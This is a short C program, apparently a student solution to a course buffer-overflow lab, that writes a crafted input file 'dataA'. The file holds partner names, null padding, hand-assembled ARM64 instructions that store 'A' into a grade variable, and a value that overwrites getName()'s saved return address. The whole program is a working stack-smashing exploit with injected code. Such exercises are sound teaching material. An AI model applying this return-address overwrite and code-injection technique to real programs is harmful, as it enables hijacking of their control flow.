#include <stdio.h>
#include <string.h>
#include "miniassembler.h"

int main (void) {
    FILE *psFile;
    char* partners = "Connor & Laura";
    int i;
    unsigned int uiMovCmd;
    unsigned int uiAdrCmd;
    unsigned int uiStrbCmd;
    unsigned int uiBCmd;
    unsigned int uiMovAdr;

    psFile = fopen("dataA", "w");

    fprintf(psFile, "%s", partners);

    for (i = 0; i < 18; i++) {
        fprintf(psFile, "%c", '\0');
    }

    /* 0x420078      | movw0, 'A' */
    uiMovCmd = MiniAssembler_mov(0, 'A');
    fwrite(&uiMovCmd, sizeof(unsigned int), 1, psFile);

    /* 0x42007C      |adr x1, grade */
    uiAdrCmd = MiniAssembler_adr(1, 0x420044, 0x42007C);
    fwrite(&uiAdrCmd, sizeof(unsigned int), 1, psFile);

    /* 0x420080      |strb w0, [x1] */
    uiStrbCmd = MiniAssembler_strb(0, 1);
    fwrite(&uiStrbCmd, sizeof(unsigned int), 1, psFile);

    /* 0x420184      | b 0x40089c  */
    uiBCmd = MiniAssembler_b(0x40089c, 0x420184);
    fwrite(&uiBCmd, sizeof(unsigned int), 1, psFile);

    /* overwrite getName()'s x30 */
    uiMovAdr = 0x420078;
    fwrite(&uiMovAdr, sizeof(unsigned int), 1, psFile);

    /* close the file */
    fclose(psFile);

    return 0;
}
